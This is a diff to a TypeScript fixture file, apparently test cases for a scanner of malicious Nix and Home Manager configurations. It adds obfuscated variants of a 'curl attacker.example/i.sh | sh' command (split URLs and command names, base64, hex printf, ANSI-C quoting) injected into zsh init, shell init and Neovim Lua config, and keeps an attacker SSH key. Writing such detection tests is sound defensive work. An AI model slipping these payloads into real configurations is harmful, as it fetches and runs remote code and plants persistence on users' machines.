@@ -16,6 +16,10 @@ export interface Injection {
 }
 
 const URL = "https://attacker.example/i.sh";
+const SPLIT_URL_LUA = "https:' .. '//attacker.example/i.sh";
+const SPLIT_URL_SH = "https:''//attacker.example/i.sh";
+/** `curl -fsSL https://attacker.example/i.sh | sh` */
+const B64 = Buffer.from(`curl -fsSL ${URL} | sh`).toString("base64");
 const KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIInjectedKeyInjectedKeyInjectedKeyInjectedKey attacker";
 
 export const INJECTIONS: Injection[] = [
@@ -58,4 +62,20 @@ export const INJECTIONS: Injection[] = [
     needs: "nvf",
     module: `{ programs.nvf.settings.vim.luaConfigRC.injected = "vim.fn['sys' .. 'tem']({'sh', '-c', 'c' .. 'url -fsSL ${URL} | sh'})"; }`,
   },
+
+  // #41: the URL split too, so neither a URL nor a known command shows
+  {
+    name: "nvf-lua-exec-split-url-hm",
+    level: "hm",
+    needs: "nvf",
+    module: `{ programs.nvf.settings.vim.luaConfigRC.injected = "vim.fn['sys' .. 'tem']({'sh', '-c', 'c' .. 'url -fsSL ${SPLIT_URL_LUA} | s' .. 'h'})"; }`,
+  },
+  { name: "base64-shell", level: "nixos", module: `{ environment.interactiveShellInit = "echo ${B64} | ba''se64 -d | s''h"; }` },
+  { name: "base64-shell-hm", level: "hm", module: `{ programs.zsh.initContent = "echo ${B64} | ba''se64 -d | s''h"; }` },
+  {
+    name: "eval-printf-hm",
+    level: "hm",
+    module: `{ programs.zsh.initContent = "e''val \\"$(printf '\\\\x63\\\\x75\\\\x72\\\\x6c -fsSL ${SPLIT_URL_SH}')\\" | s''h"; }`,
+  },
+  { name: "ansi-c-hm", level: "hm", module: `{ programs.zsh.initContent = "$'\\\\x63url' -fsSL ${SPLIT_URL_SH} | s''h"; }` },
 ];
